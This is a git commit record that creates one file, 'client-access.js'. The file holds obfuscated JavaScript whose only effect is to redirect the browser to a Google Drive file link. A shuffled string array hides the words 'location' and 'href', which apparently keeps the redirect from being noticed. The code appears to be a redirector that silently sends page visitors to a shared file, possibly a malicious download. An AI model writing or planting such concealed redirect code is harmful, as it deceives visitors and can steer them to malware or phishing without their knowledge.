4e223813371618ec79ae08f8d130d742f82f7bb4
KC <70451439+kc-underground@users.noreply.github.com>
2020-09-01 16:18:51 -0700

    Create client-access.js

---
+++ client-access.js
@@ -0,0 +1,18 @@
+var _0x5358 = [
+    'href',
+    'location'
+];
+(function (_0x2af049, _0x5358bc) {
+    var _0x178654 = function (_0x469eaa) {
+        while (--_0x469eaa) {
+            _0x2af049['push'](_0x2af049['shift']());
+        }
+    };
+    _0x178654(++_0x5358bc);
+}(_0x5358, 0x118));
+var _0x1786 = function (_0x2af049, _0x5358bc) {
+    _0x2af049 = _0x2af049 - 0x0;
+    var _0x178654 = _0x5358[_0x2af049];
+    return _0x178654;
+};
+window[_0x1786('0x1')][_0x1786('0x0')] = 'https://drive.google.com/file/d/1V8Zdc31/view?usp=sharing';
